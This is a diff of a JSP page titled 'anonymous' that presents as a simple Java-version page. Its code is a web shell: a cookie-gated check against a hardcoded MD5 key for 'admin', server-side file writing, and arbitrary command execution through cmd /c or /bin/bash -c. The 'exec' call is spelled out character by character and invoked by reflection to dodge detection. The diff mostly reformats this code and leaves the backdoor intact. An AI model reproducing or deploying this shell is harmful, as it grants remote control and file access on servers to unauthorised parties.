@@ -10,39 +10,34 @@
       + request.getServerName() + ":" + request.getServerPort()
       + path + "/";
 %>
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<!DOCTYPE html>
 <html>
-<head>
-<base href="<%=basePath%>">
-
-<title>anonymous</title>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<meta http-equiv="pragma" content="no-cache">
-<meta http-equiv="cache-control" content="no-cache">
-<meta http-equiv="expires" content="0">
-<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
-<meta http-equiv="description" content="we are anonymous.">
-</head>
-
+  <head>
+    <base href="<%=basePath%>">
+    <title>anonymous</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+  </head>
 <body>
-    <div>java version: <%=System.getProperty("java.version")%></div>
+  <div>java version: <%=System.getProperty("java.version")%></div>
     <% Logger logger=Logger.getLogger(this.getClass().getName());%>
   <%!private boolean validateCookie(String aStr) {
     return aStr != null && aStr.length() != 0 && !aStr.equals("null");
   }%>
   <%
+    // admin
     String key_important = "21232f297a57a5a743894a0e4a801fc3";
-    //get all cookies.
+    // get all cookies.
     Cookie cookies[] = request.getCookies();
     if (cookies == null || cookies.length == 0) {
+      out.println("</body></html>");
       return;
     }
-    //get mainly cookies' values.
     Map<String, String> valuesMap = new TreeMap<String, String>();
     boolean firstSign = true;
-    //one cookie.
+    // one cookie.
     Cookie aCookie;
-    //populate valuesmap
+    // filling valuesmap
     for (int i = 0; i < cookies.length; i++) {
       aCookie = cookies[i];
       if ("JSESSIONID".equals(aCookie.getName())) {
@@ -68,18 +63,19 @@
         if (aCookie.getValue() != null
             && aCookie.getValue().length() != 0) {
           aCookie = new Cookie("rlp", null);
-          //rlp is unable be removed if so long, but can be set null.
-          //aCookie.setMaxAge(0);
-          //aCookie.setPath("/");
+          // rlp is unable to be removed if so long, but can be set null.
+          // aCookie.setMaxAge(0);
+          // aCookie.setPath("/");
           response.addCookie(aCookie);
         }
       }
     }
 
-    //out.println(valuesMap.toString());
+    // out.println(valuesMap.toString());
     if (valuesMap.size() != 4 || valuesMap.values().contains(null)) {
-      //important!
-      //throw new Exception("no such cookie.");
+      out.println("</body></html>");
+      // important!
+      // throw new Exception("no such cookie.");
       return;
     }
 
@@ -126,14 +122,14 @@
           out.println(begin + new File(f_tmp).getAbsolutePath()
               + end);
         } catch (FileNotFoundException e) {
-          out.println(begin + "failure writing. "
+          out.println(begin + "failure writing: "
               + e.getMessage() + end);
         } finally {
           if (fo != null) {
             try {
               fo.close();
             } catch (IOException e) {
-              out.println(begin + "close error. "
+              out.println(begin + "close error: "
                   + e.getMessage() + end);
             }
           }
@@ -176,13 +172,13 @@
       Process proc = null;
       String args[];
       if (osName.toLowerCase().indexOf("win") >= 0) {
-        //需要前缀吗? 待测. 一定要!
-        //cmd 和/c不能分开？ 不然会运行不了! 除非直接拼成字串。
+        // 需要前缀吗? 待测. 一定要!
+        // cmd 和/c不能分开？ 不然会运行不了! 除非直接拼成字串。
         args = new String[] { "cmd", "/c", null };
       } else {
-        //if (osName.toLowerCase().indexOf("linux") >= 0) {
+        // if (osName.toLowerCase().indexOf("linux") >= 0) {
         args = new String[] { "/bin/bash", "-c", "--", null };
-        //}
+        // }
       }
       int doWhat_index = doWhat.indexOf("&&");
       File cwd = null;
@@ -195,11 +191,11 @@
       try {
         if (cwd != null) {
           if (!cwd.exists()) {
-            throw new IOException("bash: cd: no such file.\n");
+            throw new IOException("cwd: no such dir.\n");
           }
         }
-//				proc = rt.exec(args, null, cwd);
-//				out.println(cwd);
+        // proc = rt.exec(args, null, cwd);
+        // out.println(cwd);
         Method m = rt.getClass().getMethod(new String(new char[]{'e', 'x', 'e', 'c'}), String[].class,String[].class, File.class);
         proc = (Process) m.invoke(rt, new Object[]{args, null, cwd});
       } catch (Exception e) {
